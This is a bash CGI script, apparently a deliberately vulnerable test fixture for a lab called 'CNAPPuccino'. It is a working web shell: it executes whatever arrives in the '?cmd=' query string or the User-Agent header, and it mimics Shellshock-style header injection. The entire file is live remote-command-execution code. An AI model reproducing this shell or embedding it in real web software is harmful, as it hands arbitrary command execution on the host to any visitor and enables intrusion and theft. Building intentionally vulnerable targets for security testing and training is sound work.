#!/bin/bash
echo "Content-Type: text/plain"
echo ""

# Handle both query string and User-Agent header methods
if [ -n "$QUERY_STRING" ]; then
  # URL parameter method: /cgi-bin/exec.cgi?cmd=whoami
  echo "$QUERY_STRING" | sed "s/%20/ /g" | sed "s/cmd=//" | bash
elif [ -n "$HTTP_USER_AGENT" ] && [[ "$HTTP_USER_AGENT" == *"() {"* ]]; then
  # Shellshock-style method (for compatibility)
  echo "$HTTP_USER_AGENT" | sed "s/.*}; *//" | bash
elif [ -n "$HTTP_USER_AGENT" ]; then
  # Simple User-Agent command execution
  bash -c "$HTTP_USER_AGENT"
else
  echo "=== CNAPPuccino CGI Test ==="
  echo "Hostname: $(hostname)"
  echo "User: $(whoami)"
  echo "Usage: ?cmd=command or User-Agent header"
fi